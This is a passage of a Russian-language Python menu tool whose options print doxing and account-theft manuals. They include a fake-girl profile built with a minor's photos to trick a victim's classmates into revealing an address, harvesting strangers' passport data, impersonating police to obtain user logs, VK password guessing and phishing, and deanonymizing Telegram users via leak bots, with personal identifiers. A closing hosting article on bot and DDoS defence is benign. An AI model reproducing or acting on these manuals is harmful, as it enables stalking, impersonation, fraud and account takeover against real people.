├ Mfreesms.com
├ Spryng.nl - нужна регистрация
├ Smsreceiveonline.com
└ Smsget.net - Мегафон и Билайн номера

:wrench: Приложения
├ SafeUM (https://play.google.com/store/apps/details?id=com.safeum.android) — android, дает номер Литвы, не принимает СМС
└ TextNow (https://play.google.com/store/apps/details?id=com.enflick.android.TextNow) — дает номер телефона США. Принимает СМС и голосовую почту
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '74':
             print(Colorate.Vertical(Colors.cyan_to_green, """
Для примера взял знакомого (vk.com/id318621351 ). На странице абсолютно нет никаких фотографий. Друзей более 3 тысяч, искать знакомых не вариант. 
Идем в инсту, которая есть у него в ссылках. Из всех фотографий в глаза бросается вид с балкона многоэтажного дома. Этого еще мало. В фотографиях есть фото с какого-то парка. На данный момент нам этого достаточно. Идем в Google карты, чекаем все парки, где рядом строятся дома. Находим "Центральный парк культуры и отдыха." Вторая фотография, была возможно сделана в этом парке. Идем теперь искать рядом с этим парком новостройки и красный дом. 
Ищем информацию о продаже квартир в Рязане. Видим фотографию многоэтажного дома, а ведь фотография была сделана с примерно похожего дома. Находим объявление о продаже квартир на улице Татарская 60. Теперь гуляем по городу с помощью панораме и натыкаемся на многоэтажку. Крутимся, вертимся. Видим оранжевый или же красный дом с выпуклыми балконами. Идем чуть дальше, видим на ним синенький дом, который как раз же был на фотографии. И рядом находится 17 или 18 этажный красный дом. 

Итог: фотография сделана с многоэтажного дома, сделанного по адресу Рязань, улица Татарская дом 56а. 
Yariomi (Ярослав Верховный)
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '75':
             print(Colorate.Vertical(Colors.cyan_to_green, """
1. Переходим в @spambot и пишем нечто в духе: «Telegram developers! I have not logged into telegram for a long time, and have not corresponded for a long time in various public groups, and you spammed me here, most likely blocked! But I think it was not right because there was nothing special! Therefore, I ask you to remove my restrictions!»;
2. Ожидаем от 1го часа до нескольких дней;
3. ГОТОВО!

НАДО ПИСАТЬ СВОЙ ТЕКСТ , ЭТО ПРОСТО ПРИМЕР. ОБЕЗАТЕЛЬНО НА English

Перевод текста: Разработчики телеграмм! Я давно не заходил в телеграм, и давно не переписывался в разных пабликах, а вы меня тут спамили, скорее всего заблокировали! Но я думаю, что это было неправильно, потому что не было ничего особенного! Поэтому прошу снять с меня ограничения!»;
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '76':
             print(Colorate.Vertical(Colors.cyan_to_green, """
Смотрим этот ролик:

https://www.youtube.com/watch?v=85ag5t6rTAE&feature=youtu.be
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '77':
             print(Colorate.Vertical(Colors.cyan_to_green, """
Привет. Сегодня я научу тебя оформлять фэйк-страницу, которая может пригодится, к примеру, для того чтобы написать одноклассникам какого нибудь челика и от имени милой девочки с помощью СИ выведать интересную для нас информацию. Например, адрес.

Итак, приступим.

1. Покупаем левую женскую страницу на lolzteam'e, либо на каком либо магазине deer.io. Можно даже спамблок и восстановить на свой номер. Это уже зависит от вас.

2. Удаляем всех возможных друзей, находим в интернете деффку лет 14-15 и ставим её фотографии себе на страницу. Главное, чтобы всё было залито не сразу, а в промежутках 2-3 и даже больше дней. Крутим на каждую фотку лайков по 10. Можно даже немного крутануть подписчиков. Также, подписываем на паблики с цитатками и прочую ухйню.

3. Когда мы уже имеем жертву, создаём анкету в ДайВинчик'е, мол, ищу друзей, парня и т.п. В качестве города указываем город жертвы. Заливаем имя и фотографии - те, которые стоят на фэйке. Готово. Ставим всем симпатии, ждём ответов. В 90% случаев нам начнут кидать симпатии. Все принимаем и всех добавляем. Так мы получим где-то 20-30 друзей из города жертвы. Это уже исключит сомнения по поводу того, что это фэйковый аккаунт.

4. В качестве города ставим город жертвы. Школу можете поставить левую, а лучше вообще не указывать.

5. Ну всё, можно считать, что фэйк оформлен. Можете писать одноклассникам жертвы, мол, привет, я была с *Ф.И жертвы* в лагере/санатории и хотела бы с ним связаться. Дай его номер, пожалуйста.
(Главное, писать всем разные текста. И не в одно сообщение, а весь этот посыл умещать в несколько).
Если кидает ссылку на вк, говори, что игнорит и т.п
Если кидает в чс, пишем следующей жертве и т.д.

Суть ты понял, можешь придумать ещё что-то от себя. Главное, не накосячь.

"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '78':
             print(Colorate.Vertical(Colors.cyan_to_green, """
для верификации кошелька нужны такие данные как СНИЛС паспорт ИНН и т.д

1.заходим в ВК ищем мужиков которым больше 30 лет 
2.копируем ссылку и кидаем в гб
3.достаем номер и переходим в другие боты к примеру квик осинт
4.получаем паспортные данные и все что нужно для верификации вашего кошелька
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '79':
             print(Colorate.Vertical(Colors.cyan_to_green, """
Хочу поделится схемой угона username в Телеграме. Многие о нем слышали, я и сам давно знал про это, но не придавал вниманию, пока сам не столкнулся с данной ситуацией.

Есть способ как сам Телеграм может передать вам почти любой username. Для этого нужно иметь с данным именем аккаунты в других соц сетях, достаточно будет Twitter и Instagram. Регистрируйтесь с нужным с вам username в данных соц сетях, создаете мнимую деятельность от лица какой-то компании, достаточно будет 2-3 недели публиковать посты, показать что аккаунты живые. Далее пишите в тех поддержку Телеграм сообщение, что хотите присвоить себе имя, так как ваша компания уже ведет деятельность в других соц сетях. Через некоторое время без лишних вопросов вам спокойно передают нужное вам имя.

Столкнулся сам с такой проблемой, получив от Телеграм сообщение, что мой username успешно передали другим в связи с политикой компании. За место моего имение *username* добавили *username_mv*. Хорошо, что вовремя заметил и успел везде на форумах оповестить и поменять контакты. Посмотрел аккаунты с моим именем в других соц сетях и удивился, как телеграм вообще может совершать такие действия. Там были рецепты еды, с корявым текстом и левыми фотографиями блюд, не было даже описание и аватарки на аккаунтах.

Поняв, что вернуть ничего не удасться, сменил контакты на форумах и смирился, что будут новые. Решил для предотвращения такой ситуации в дальнейшем зарегистрировать с моим username аккаунты в других соц сетях, и с удивлением обнаружил, что они уже заняты. Написал в тех поддержку Телеграма, объяснив ситуацию, буду ждать от них ответа и готовится снова менять везде контакты.

Поэтому предупреждение для всех, что бы не отдать свое имя мошенникам, которые в дальнейшем смогут от вашего лица обмануть людей на деньги и испортить вашу деловую репутацию, в спешном порядке займите вашим username другие соц сети. Явление может иметь массовый характер и отрабатывать аккаунты многих крупных продавцов, может быть, уже по вашему имени написано письмо в тех поддержку и оно ожидает трансфера третьи руки.

*СПОСОБ НЕ ЯВЛЯЕТСЯ НОВЫМ, ОН РАБОТАЕТ УЖЕ ДАВНО, НО КРАЙНЕ ШИРОКУЮ ОГЛАСКУ НАЧАЛ НАБИРАТЬ ОТНОСИТЕЛЬНО НЕДАВНО*
Agramus - я позаимствовал данный материал, я не его создатель.
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '80':
             print(Colorate.Vertical(Colors.cyan_to_green, """
как засрать данные в гб? всё просто, для этого нам надо 4 рубля, временная почта и впн.
заходим в бота
нажимаем старт
дальше нажимаем пополнить
пишем цифру 1, включаем впн, заходим на сайт и вводим там временную почту и оплачиваем
пополнили? всё
в гб будут такие данные: ваш возможный сервер и врменная почта. используйте

а еще проще будет удалить данные о себе в гб)) 
используйте

by @TEPOCBAT
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '81':
             print(Colorate.Vertical(Colors.cyan_to_green, """
BY QWENTY
1. Первый способ взломать Вконтакте — подобрать пароль.
Bам потребуется логин для входа в аккаунт: как правило, это номер телефона пользователя или его почта. Если вы знаете номер мобильного телефона, который, наверняка, привязан к странице, то это здорово. Если нет, то очень плохо. Надеюсь, вы каким-то образом смогли узнать номер.

2. Переходим ко второму шагу. Теперь, посредством подбора будем прописывать пароль.

Наиболее частые пароли:

Дата рождения. попробуйте прописывать дату рождения пользователя в разных вариациях: числомесяцгод без пробелов, годмесяцчисло и т.д.;
Не редкость, когда используют в качестве пароля номер мобильного телефона. Возможно, номер не своего телефона. Иногда дописывают год рождения, в конце, либо какие-то слова: фамилию, имя…;
Исходя из средств защиты электронно почты стало популярным ставить на пароль девичью фамилию матери;
Ник в онлайн игре, в которую часто зарубается. Многие не защищаются от взлома, а просто ставят пароли с девизом: "главное не забыть, а то мороооки будеет;
Имя кого-либо: сестра, брат, мама, папа, я, девушка, учительница и т.п. by Mxlly and Alpha
Набор цифр от балды для необычайной легкости входа: 123456 в различных вариациях;
Комбинация букв в верхнем левом углу клавиатуры: qwerty или йцукен;
Наиболее популярные пароли:

123456
123123
111111
123456789
12345678
qwerty


2. Самый популярный метод взлома страницы Вконтакте — фишинг.
Некогда крайне эффективный способ взлома, под названием фишинг. Работает на новичках в мире Интернета и соответственно на недавно зарегистрировавшихся пользователях социальной сети Вконтакте.

В чем суть?
Суть в том, что создается сайт, внешним обликом напоминающий вк, практически полностью скопированный. Какие именно отличия — неважно, поскольку все фишинговые ресурсы разрабатываются разными программистами. Кто-то сделает более мастерски, а кто-то слажает не по-детски. Так что, каких-то определенных отличий в дизайне и структуре нет.

Как все происходит?
Вы зайдете на сторонний сайт, думая, что попали в вк. После чего введете пароль и логин. Злоумышленники увидят введенные данные и воспользуются ими для входа в ваш аккаунт на vk.com. Если стало ясно, что вы не на том сайте, а пароль и логин уже отправлены, то скорей бегите на vk.com и меняйте пароль.


Комнатный хакер
978 подписчиков

Подписаться
Как взломать страницу вконтакте
9 июля 2019
196K прочитали
На 2019 год защита Вконтакте стала очень сильной. Теперь не действуют старые алгоритмы взлома из YouTube роликов.

Однако, существуют методы взлома вк, прибегая к которым, мы не пытаемся найти баги сайта и тем самым обойти защиту. В сегодняшнем выпуске мы поговорим о том, как взломать страницу вконтакте, основываясь на методе подбора пароля и на невнимательности пользователя.

Исходя из этого, уже можно сделать вывод: взламывать страницу через специальные скрипты, кодерные файлы крайне непросто.  Для такой работы потребуется опытный хакер с навыками программиста.

Прежде чем я дам вам подробные инструкции, давайте разберемся, зачем вообще есть необходимость взламывать чужие аккаунты?

Зачем нам взламывать страницы вконтакте?
Безусловно, у каждого из вас есть веские причины, которые озвучивать думаю не стоит. Я, в свою очередь,  пришел к выводу, что людей тянет на взлом по следующим причинам:

Необходимо срочно узнать, кто твоему(ей) парню/девушке пишет сообщения. Сразу скажу: ни к чему хорошему это не приведет;
Вам требуется взломать собственную страницу, поскольку номер телефона утерян, а пароль забыт. Восстановить доступ не получается. В таком случае, восстановите сим-карту  в салоне связи вашего оператора;
Я считаю, что многие хотят научиться взламывать страницу в вк для того, чтобы оказывать подобные услуги другим людям. Имея с этого хорошие деньги.
Ну, и последняя причина — это власть и контроль. Если у вас есть возможность контролировать личную жизнь других людей или хотя бы ее часть, то вы будете горды собой. Наверное, все прекрасно понимают, что тщеславие такой грех, от которого нельзя избавиться. К тому же, сейчас транслируется много фильмов про хакеров и их возможности. Просматривая такие сюжетные картины, людям хочется быть похожими на своих героев.
С причинами определились, теперь перейдем к способам взлома вк.

Как взломать страницу вконтакте
1. Первый способ взломать Вконтакте — подобрать пароль.
1. Вам потребуется логин для входа в аккаунт: как правило, это номер телефона пользователя или его почта. Если вы знаете номер мобильного телефона, который, наверняка, привязан к странице, то это здорово. Если нет, то очень плохо. Надеюсь, вы каким-то образом смогли узнать номер.

2. Переходим ко второму шагу. Теперь, посредством подбора будем прописывать пароль.

Наиболее частые пароли:

Дата рождения. попробуйте прописывать дату рождения пользователя в разных вариациях: числомесяцгод без пробелов, годмесяцчисло и т.д.;
Не редкость, когда используют в качестве пароля номер мобильного телефона. Возможно, номер не своего телефона. Иногда дописывают год рождения, в конце, либо какие-то слова: фамилию, имя…;
Исходя из средств защиты электронно почты стало популярным ставить на пароль девичью фамилию матери;
Ник в онлайн игре, в которую часто зарубается. Многие не защищаются от взлома, а просто ставят пароли с девизом: "главное не забыть, а то мороооки будеет;
Имя кого-либо: сестра, брат, мама, папа, я, девушка, учительница и т.п.
Набор цифр от балды для необычайной легкости входа: 123456 в различных вариациях;
Комбинация букв в верхнем левом углу клавиатуры: qwerty или йцукен;
Наиболее популярные пароли:

123456
123123
111111
123456789
12345678
qwerty
Хотите больше паролей: тогда откройте статью самые популярные пароли.

2. Самый популярный метод взлома страницы Вконтакте — фишинг.
Некогда крайне эффективный способ взлома, под названием фишинг. Работает на новичках в мире Интернета и соответственно на недавно зарегистрировавшихся пользователях социальной сети Вконтакте.

В чем суть?
Суть в том, что создается сайт, внешним обликом напоминающий вк, практически полностью скопированный. Какие именно отличия — неважно, поскольку все фишинговые ресурсы разрабатываются разными программистами. Кто-то сделает более мастерски, а кто-то слажает не по-детски. Так что, каких-то определенных отличий в дизайне и структуре нет.

Как все происходит?
Вы зайдете на сторонний сайт, думая, что попали в вк. После чего введете пароль и логин. Злоумышленники увидят введенные данные и воспользуются ими для входа в ваш аккаунт на vk.com. Если стало ясно, что вы не на том сайте, а пароль и логин уже отправлены, то скорей бегите на vk.com и меняйте пароль.


3. Взлом Вконтакте с помощью троянского  вируса.
Троянская программа всегда была опасной для компьютера. Sirius Team. Поймать вражеского коня на вк можно так: захотели вы, например, найти способ посмотреть всех пользователей, кто просто посещает вашу страницу и пошли рыскать по интернету. Бац, какое счастье: я нашел программу! Она определяет гостей, путем отслеживания данных моей страницы, для этого достаточно прописать логин и пароль! Будьте уверены, с высокой долей вероятности вы поймали трояна.

В общем и целом, скачивание программ и прописывание логина и пароля, дословно означает, сдать свой аккаунт с потрохами.

4. Слабенький способ взлома — Брут.
Брут — это способ взлома с использованием программы для подбора логина и пароля.Чтобы какая-то левая прога не взломала вас, необходимо установить сложный пароль. Всё! Больше ничего не надо! Сложный пароль — это минимум 8 символов, используются буквы и цифры.

5. Использовать сайт https://vzlom.io/vkontakte
Все понятно, думаю сами разберетесь
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '82':
             print(Colorate.Vertical(Colors.cyan_to_green, """
ну что я комару @KomaruKrut решил написать вам мануал по абузу гб сабки с помощью этого способа вы сможете всегда за фри пробивать в гб 
мой переходник: @perexodnik_komaruuu


и так что нам понадобится для абуза Гб?

Любая ненужная нам сим

чтобы пробивать всегда за фри вам всего лишь нужно
1)Создать акк на эту ненужную сим
2)Зайти в гб
3)После того как вы зашли в гб вам даётся фри 5 минут
4)Вы тратите эти 5 минут и потом если вам надо еще раз кого то пробить просто удаляете аккаунт и заново создаем его и делаем все то же что было до этого


и вот с помощью этого способа можно всегда пробивать за фри в гб мануал писал
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '83':
             print(Colorate.Vertical(Colors.cyan_to_green, """

Имеется всего два способа деанонимизировать личность, которая использует виртуальный номер на телеграм-платформе.

1. Логирование
2. Ручной поиск

Первый способ деанонимизации пользователя, который приобрел виртуальный номер - Логирование.

Что бы получить логи с виртуального номера жертвы, мы применяем точно такую же схему с мануала по вытягиванию логов телеграм.

Что бы вытянуть логи, нам нужен соответственно номер виртуальный жертвы, а так же сервис, где он покупал. В нашем случае, OnlineSim

@OCMT_bot - приобретаем подписку за 3$, нажимаем "отправщик"; в тему письма пишем статью по которой можно осудить жертву; текст пишем по шаблону ниже; выбираем "Support", а затем "mvd.ru". Почты находим на сайте сервиса

Шаблон:

"Здравствуйте, мы расследуем дело по статье [статья]. Нам была предоставлена информация от третьих лиц, что нужный нам пользователь покупал на вашей платформе услуги виртуальных номеров.

Мы просим вас выдать всю имеющуюся информацию по данному номеру [виртуальный номер] на нашу гражданскую электронную почту [email], с целью остановить кибер-преступления с его стороны.

Надеемся на сотрудничество, всего доброго."

После этого, в течении недели (лично я ждал два дня), вам пришлют на почту файл с названием "(виртуальный номер жертвы) Logs (дата его покупки)"

Там будет такая информация, как:

Реквизиты, с которых оплачивали; Айпи-Адрес; Пароль и Никнейм на сайте.

Вторым способом деанонимизации является ручной поиск.

Как можно установить личность жертвы, имея на руках лишь его телеграм-аккаунт? Способов по правде мало, ведь телеграм - самый защищенный мессенджер, однако мы рассмотрим ниже те способы, которые по моему мнению самые лучшие и легкие для новичков.

Первым способом является обычный "пробив" по телеграм ботам без всяких хитростей, архив ботов, имеющих свойство поиска по телеграм аккаунту я оставлю в самом низу, этот раздел нет смысла расписывать.

Дальше есть три способа поиска, два - легких, однако третий способ довольно сложный, однако с возможностью облегчить.

Нам нужно найти твинк-аккаунт жертвы, если жертва сидит с виртуального номера, или же на аккаунте не пропалены данные.

Как можно найти?

1. TeleSint - бот, имеющий свойство искать в каких чатах сидит жертва. Это самый тяжелый способ, ведь искать твинк аккаунт нужно вручную. Это крайний случай, при котором мы не смогли найти жертву разными другими.

2. Pars - сайт, благодаря которому мы сможем найти все упоминания телеграм-аккаунта жертвы во всех телеграм-чатах, благодаря чему сможем найти банворды жертвы и снести ему аккаунт, или же найти твинк.

3. GlazBoga - да, как бы банально не звучало название раздела, в глазе бога есть своего рода функция, благодаря которой мы можем увеличить шанс поиска номера жертвы.

 Нам нужно узнать историю изменений никнеймов аккаунта, получаем мы примерно такое:

📧  ID: 6169299283

🗝 Регистрация: ≈фев,2023 (1 год)
🗃 Изменения профиля: 
├   09.05.2023 - @Villmalov | Алина | 
├   07.05.2023 - @Villmalov |  | 
├   21.02.2023 - @anonimgod | Букинг Приколов | 
├   19.02.2023 - @anonimgod | мистер анонімчик, мысли о коZле | 
└   04.02.2023 - @anonimgod | анонімчик | 

 Получив данные результаты наша задача скопировать каждый ник жертвы, в нашем случае это:

Букинг Приколов;
мистер анонімчик, мысли о коZле;
анонімчик.

Мы не копируем ник "Алина", ведь это не гарантия поиска.

После того, как мы все скопировали, мы по очереди вбиваем каждый ник в глаз бога; нажимаем кнопку "поиск по контактам" и следом жмем "весь мир". Большой шанс, что мы получим такой вывод:

🔎
└ 79105477957  - Букинг Приколов

4. Unamer - самый любимый мой способ, ведь благодаря этому телеграм-боту можно найти твинк-аккаунты жертвы; старые аккаунты, даже если они удалены.

У нас есть несколько факторов пробива: никнейм, юзернейм.

В бота нам нужно вбить сначала юзер, получив все аккаунты, на котором светился данный нейм и предварительно пробив их; 

Если этот способ не дал результатов, нам нужно снова получить историю изменений аккаунта, получив никнеймы.

Мы получили точно так же;
мистер анонімчик, мысли о коZле;
анонімчик;
Букинг Приколов

Что мы делаем далее? Переходя в бота Unamer, снизу мы видим панельку поиска по ФИ, жмем на неё и вводим никнейм жертвы, в панельке фамилии жмем кнопку пропустить и ждем результаты. 

* Вводить ли фамилию в этом боте и какую определяется так же выводом из глаза бога результатом истории изменения никнеймов. Имя•Фамилия там разделяются символом "|", следуем ему. 

5. Maigret - бот способен искать по юзернейму/никнейму. Так же получаем вывод истории изменений аккаунта и вводим по очереди каждый псевдоним жертвы.

6. UsersBox - бот изначально идет по поиску по утечкам, однако можно попробовать найти ВК жертвы по псевдониму.

7. Архив
Архив ботов, имеющих свойство пробива аккаунта:

GTA - @GTA_searchBot
GlazBoga - @superprobivbot
SmartSearch - @helper_inform_bot
Telegram Analyst - @TgAnalyst_bot
Архангел - @Angel_SearchBot
Quick Osint - @QuickOSINT_bot

На этом, вроде как все.

! На телеграм-ботах, в лице: Гриди/Аврора/ГетСмс способ не работает.
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '84':
             print(Colorate.Vertical(Colors.cyan_to_green, """
https://t.me/+3srREHLIMWNmNWIy
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '85':
             print(Colorate.Vertical(Colors.cyan_to_green, """
Защита от ботов и DDoS-атак для сайта - необходимость для большинства современных интернет-проектов. Почти ни для кого уже не секрет: всплеск активности на сайте не всегда может означать приток живых посетителей. Намного чаще она бывает результатом нашествия ботов и спамеров, что как следствие увеличивает нагрузку на сайт, увеличивает количество спама и подвергает данные вашего ресурса опасности. Конечно, такие последствия никак нельзя назвать желательными, и первым делом встает вопрос - как защититься от таких вторжений? В этой статье мы подробно поговорим о таком явлении как парсинг, о том как защитить ваш сайт от вредоносных ботов, и что делать при DDOS-атаке на сайт.

 
Как определить робота
Роботы заходят на сайт всегда - это просто часть современного интернета, даже поисковые системы индексируют ресурсы именно так. Но с помощью ботов (или автоматических сканеров) можно также парсить данные, т.е. Извлекать информацию с веб-ресурсов. Занимающийся этим бот представляет из себя программу или скрипт, выполняющий простые автоматизированные действия на сайте: выгрузка кода страницы, разделение его на составные элементы, вычленение данных и сохранение в базе. Цели для такого сбора могут быть разные. В большинстве случаев веб-сайты парсят чтобы получить определенные данные со страниц конкурентов, которые можно в дальнейшем использовать на собственных ресурсах, а также чтобы совершать вредоносные атаки, но также парсинг проводится и в аналитических или исследовательских целях, что само по себе не подразумевает ничего плохого. Итак, боты посещают сайт - что это могут быть за боты?

 
Поисковые роботы или web-crawlers. Это тип ботов, которые занимаются сканированием и индексацией информации с веб-сайтов для дальнейшего их занесения в базу данных поисковых систем. Так свои краулеры есть у всем известных Google и Яндекс, и их действия скорее помогают владельцу сайта чем вредят, так как именно с их помощью осуществляется SEO-продвижение сайта и приток трафика из поисковиков. 

Парсеры или web-scrappers. Такие боты в основном собирают информацию с сайтов для дальнейшей ее перепродажи заинтересованным лицам. Так, например, конкурирующие компании могут получать информацию по ценам, фотографиям и товарному ассортименту других интернет-магазинов, собранную парсерами. Такой парсинг осуществляется с помощью поисковых ботов, используемых для получения определенного вида данных, сканеров HTML, парсеров экрана на основе браузера, а также специальных парсинг-сервисов.

Злонамеренные боты. Отдельной категорией выступают боты, которые создаются с целью взлома и вывода сайтов из строя. Такие боты сканируют сайт не на предмет содержащейся там информации, а в первую очередь на уязвимые компоненты, в которые могут быть внедрены элементы удаленного управления или совершения вредоносных действий. Некоторые такие боты атакуют сайт напрямую - как правило, те, что написаны конкретно для проведения DDoS-атак (Denial of Service или «отказ в обслуживании»), призванных создать такие условия, чтобы пользователи больше не смогли получить доступ к ресурсу. Основные заказчики таких атак - конкуренты, желающие вывести соперника из строя или хотя бы нанести урон, на время лишив сайт работоспособности.

 
Итак, подведем промежуточный итог: как избавиться от ботов на сайте? Полностью это сделать не получится вообще, как невозможно и полностью исключить копирование контента вашего сайта обычными живыми людьми. С одной стороны, юридически запретить использовать ботов на вашем ресурсе невозможно, да и не нужно - ведь поисковые системы узнают о вас также через ботов. С другой стороны, DDoS-атаки считаются тяжким, уголовно наказуемым и международно преследуемым деянием, которое может нанести колоссальные убытки - и за которое может грозить реальный срок. В общем. защищаться от DDoS’а нужно так же тщательно, как от воровства или вооруженного нападения.

 
Лучший способ надежно избавиться от вредоносных ботов, но не повредить своему ресурсу - защита со стороны хостера вашего проекта. Например, наши клиенты защищены от зловредных роботов, “пауков”, похитителей контента и хакерских атак с помощью фильтрации трафика в режиме реального времени.

 
Однако, конечно, существуют и способы как можно самостоятельно обнаружить и снизить активность парсеров и вредоносных ботов на вашем ресурсе.

 
Способы обнаружения
Защита от отдельных роботов или даже полноценная защита от ботнетов строится на одном принципе: сначала нужно отследить нежелательный трафик. Для того чтобы узнать, является ли приток трафика результатом атаки ботов, можно обратиться к следующим методам:
 

Отследить статистику обращений можно обратившись к логам сервера посредством файла access.log. Это текстовый файл, в котором содержится полная информация по трафику на сервере. В нем можно просмотреть IP-адрес, с которого произведен запрос, его время, тип и содержимое. Особое внимание здесь стоит обратить на параметр %{User-Agent} - заголовок, который содержит информацию о запроса, то есть приложение и язык, на котором он осуществлен. Многократное отправление запросов с одного IP и от одного и того же User-Agent с регулярным интервалом, должно вас насторожить.

Использование JavaScript может помочь собрать значительное количество информации о пользователях, которые посещают сайт (разрешение экрана, часовой пояс, кнопки, по которым осуществляется клик). В сочетании с данными из логов, можно выявить кто из пользователей скорее всего является парсером, если просто сопоставить информацию о запросах.

 
Нежелательные запросы, которые приходят от агентов с одинаковым запросом, регионом, часовым поясом и размером экрана, которые приходят с одного и того же IP, можно смело блокировать одним из способов, которые мы опишем ниже.
 

Важно! Не все запросы от ботов могут приходить с одинакового IP-адреса. Обычно боты используют сеть прокси, таким образом осуществляя распределенный парсинг. Однако если даже с разных серверов поступают одинаковые запросы, скорее всего это повод для блокировки.





 
captcha.jpg

 
Защита от ботов для сайта
Как уже упоминалось, полностью избавиться от ботов раз и навсегда невозможно, однако существует немало способов ограничить их активность. Рассмотрим некоторые наиболее действенные из них:

 

Проще всего - доверить эту работу профессиональному сервису. Каждый клиент нашего хостинга получает базовую защиту от ботов защищены от зловредных роботов, “пауков”, похитителей контента и хакерских атак с помощью сервиса BotGuard. Ни DDoS-атаки, ни копирование контента, ни получение доступа к уязвимостям ресурса отныне вам не страшны!

Один из самых простых, и практически универсальных способов борьбы с ботами - создание фильтра по User Agent в файлах .htaccess (hypertext access) и robots.txt. Эти файлы находятся в корне вашего сайта на сервере, доступ к нему осуществляется через кабинет настроек хостинга. Если файлов с таким названием там нет - их нужно создать через блокнот, переименовать соответствующе, и загрузить в корневой каталог . Далее в этих файлах нужно создать правила для конкретных сомнительных пользовательских агентов, которые вы обнаружили посредством логов сервера и JavaScript.


Для ограничения в .htaccess нужно вставить в файл следующий текст:
RewriteCond %{HTTP_USER_AGENT} Имя_бота

RewriteRule (.*) - [F,L]

Ограничить доступ через robots.txt можно как частично, так и полностью. Чтобы закрыть для бота конкретные результаты, пропишите текст:
User-agent: Имя_бота

Disallow:/название_раздела/

Disallow:/messages/
 

Чтобы ограничить сайт полностью:

User-agent: Имя_бота

Disallow:/

 
Также можно уменьшить количество посещений для конкретного бота:

User-agent: Имя_бота

Crawl-delay: 10

Также рекомендуется ограничить доступ от запросов с пустым User Agent, что чаще всего встречается у плохо написанных ботов, где значение проставить просто поленились.

 
Большинство парсеров не отличают реальные результаты поиска от ханипотов, в то время как реальный посетитель такой результат не увидит вовсе благодаря встроенному элементу для сокрытия содержимого (CSS). Однако текст и адрес таких ловушек нужно периодически менять, потому что постепенно боты научатся их обходить.

 
Важно! Учтите, что для того, чтобы доступ к сайту не был заблокирован для “белых” поисковых ботов также как и для парсинговых, например для ботов от Google и Яндекс, необходимо запретить /scrapertrap/ в файле robots.txt.

 

 

Какой бы метод вы ни выбрали, необходимо учитывать, что современные хорошо написанные боты довольно умело имитируют поведение в сети человека, и важно учитывать это, чтобы вместе с ботами вы не защитились случайно и от реальных посетителей вашего сайта, а также не допустили блокировки полезных краулеров и не навредили SEO оптимизации. Поэтому действуйте грамотно и осторожно.

 

setevoe-vzaimodejcnvie.jpg

 

DDoS сайта
Говоря о вредоносных ботах нельзя обойти такую тему, как защита от DDoS-атак. На данный момент эта проблема является особенно актуальной для некоторых конкретных сфер деятельности. В их число входят сайты онлайн-магазинов, многопользовательских онлайн игр, биржевых и инвестиционных площадок, а также других коммерческих ресурсов. Иногда DDoS-атака на сайт может быть спровоцирована агрессивной политикой конкурентов, которые стремятся вывести ваш ресурс из строя, но бывает что ресурс также подвергается нападкам со стороны хакеров-вымогателей, а иной раз может быть атакован просто из развлечения без злой цели. Какой бы то ни было, любому серьезному проекту потребуется защиты от этих нападок.

 
Обычно DDoS-атаки описываются в семиуровневой модели OSI. Первый уровень сети - физический, второй - канальный (связывает сети на уровне каналов, через коммутаторы) и чем выше - тем абстрактнее. DDoS-атаки могут быть низко- и высокоуровневые. Самые низкоуровневые атаки - на сетевом, третьем-пятом уровнях: "забивание" канала ping-запросами или же запросами на подключение по протоколу TCP(т.н. SYN-запросы), с ними иметь дело просто. Но чем выше уровень атаки, тем сложнее становится защита. 

 
Высокоуровневые атаки высшего, 7 уровня, опаснее. Они направлены на самые тяжелые страницы сайта или осуществляют на нем сложные действия, например, настраивают фильтр каталога для выдачи максимальной выборки товаров. Атака производится сотнями или тысячами ботов, отказ в обслуживании может происходить со стороны веб-сервера, бэкенда, либо сервера баз данных. 

 
Чтобы справиться с такими атаками мы используем WAF (Web Application Firewall) - особую систему мониторов и фильтров, предназначенных для обнаружения и блокирования сетевых атак на веб-приложение. Однако это достаточно высокий уровень атаки, и WAF мы подключаем лишь в самых тяжелых случаях - как правило, достаточно и базовой защиты, которая по умолчанию включена на всех наших серверах.

 
Если ваш сайт хостится на вашем собственном оборудовании у вас в серверной, то разбираться с нападением, скорее всего, придется самостоятельно. Для того, чтобы ваш сайт был разблокирован, потребуется подключить дополнительный IP-адрес, либо специализированный сервис, в некоторых случаях хорошим вариантом может выступить переход на VDS или выделенный сервер, к которых уже подключены подобные сервисы. В конце концов, массированную атаку можно просто переждать!

 
Но лучше всего, конечно, если у вас есть надежный хостер, которому можно делегировать защиту сайта от DDoS. Со своей стороны мы всегда ответственно относимся к безопасности наших клиентских проектов, так что просто работая с нами от этой головной боли вы уже считайте избавились. У нас по умолчанию подключена защита всех наших сетей от DDoS, бесплатно можно подключить начальный тариф защиты от ботов, и дополнительно возможно подключить WAF или защиту от DDoS 7ого уровня и расширенную защиту от ботов Botguard.

 
Заключение
